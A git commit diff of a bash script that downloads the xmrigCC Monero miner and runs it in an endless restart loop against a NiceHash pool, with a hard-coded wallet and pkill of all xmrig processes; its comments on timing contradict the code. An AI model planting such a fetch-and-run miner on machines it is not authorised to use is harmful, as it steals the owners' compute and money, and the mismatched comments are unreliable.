05637c848da3170350cd7a7c028eb77a45f17ecb
annepetranao <149349853+annepetranao@users.noreply.github.com>
2024-01-21 12:40:24 +0800

    Update mhm.sh

--- mhm.sh
+++ mhm.sh
@@ -1,21 +1,29 @@
 #!/bin/bash
 
-# Download and extract XMRig
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz
-tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz
+# Define the wait time of 10 minutes (600 seconds)
+SLEEP_DURATION=60
 
-# Infinite loop to restart miner every 15 minutes
+# Download and extract XMRig
+if [ ! -f xmrigDaemon ]; then
+    echo "Downloading and extracting XMRig..."
+    wget -q --show-progress --progress=bar:force https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz
+    tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz
+fi
+
+# Infinite loop to restart miner every 10 minutes
 while true; do
-   # Start the miner in the background
+   # Start the miner
+   echo "Starting xmrigDaemon..."
    ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.newguy -p x -a rx/0 -k &
-   
-   # Save the PID of the miner
-   XMRIG_PID=$!
+   DAEMON_PID=$!
 
    # Sleep for 15 minutes
-   sleep 900
-   
-   # Kill the miner process and wait a moment before restarting
-   kill -9 $XMRIG_PID
+   echo "Mining for $SLEEP_DURATION seconds..."
+   sleep $SLEEP_DURATION
+
+   # Kill all xmrig related processes
+   echo "Stopping xmrig processes..."
+   pkill -9 xmrig
+
    sleep 3
 done
